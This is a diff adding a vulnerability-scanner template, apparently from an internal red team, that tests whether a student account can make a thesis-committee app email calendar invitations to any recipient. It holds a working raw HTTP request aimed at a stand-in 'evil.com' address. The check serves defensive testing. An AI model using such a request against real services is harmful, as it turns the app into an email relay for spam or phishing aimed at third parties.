@@ -1,0 +1,20 @@
+id: rt07-calendar-relay-email-aluno
+info:
+  name: "STUDENT envia email de agenda da banca para endereco arbitrario (relay/spam) - calendar-email sem checkRole"
+  author: redteam-sisdef
+  severity: low
+  description: "POST /calendar/:bancaId/email tem so requireAuth (aluno ok) + getBancaById (visibilidade herdada). Qualquer logado dispara emails com conteudo da app para destinatarios arbitrarios. Em NODE_ENV=test o SMTP real pode falhar; se casar, a exploração e real em prod."
+  tags: redteam,abuse,relay
+http:
+  - raw:
+      - |
+        POST /calendar/2/email HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{TOKEN_STUDENT}}
+        Content-Type: application/json
+
+        {"email":"victim@evil.com","recipientName":"Red Team Probe"}
+    matchers:
+      - type: word
+        words:
+          - "Convite enviado com sucesso"
